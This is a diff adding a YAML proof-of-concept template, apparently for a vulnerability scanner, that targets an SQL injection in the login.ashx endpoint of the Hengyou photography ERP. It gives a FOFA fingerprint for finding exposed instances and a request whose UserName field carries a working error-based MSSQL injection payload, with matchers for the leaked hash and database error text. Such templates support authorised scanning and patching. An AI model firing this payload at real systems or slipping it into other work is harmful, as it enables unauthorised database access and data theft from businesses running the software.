@@ -1,0 +1,28 @@
+id: poc-yaml-hengyousoft-erp-login-ashx-sqli
+info:
+  name: 恒友摄影ERP login.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 恒友摄影ERP
+  fofa: body="BookChooseDateOrder.html"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin%27+AND+1=sys.fn_varbintohexstr(hashbytes('md5','{{.t1}}'))--&UserPwd=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"出错了") &&
+
+    !contains(body,"<") &&
+
+    matches(body,"转换成数据类型(.*?)时失败") &&
+
+    matches(body,"在将(.*?)值")
+
+    '
+transport: http
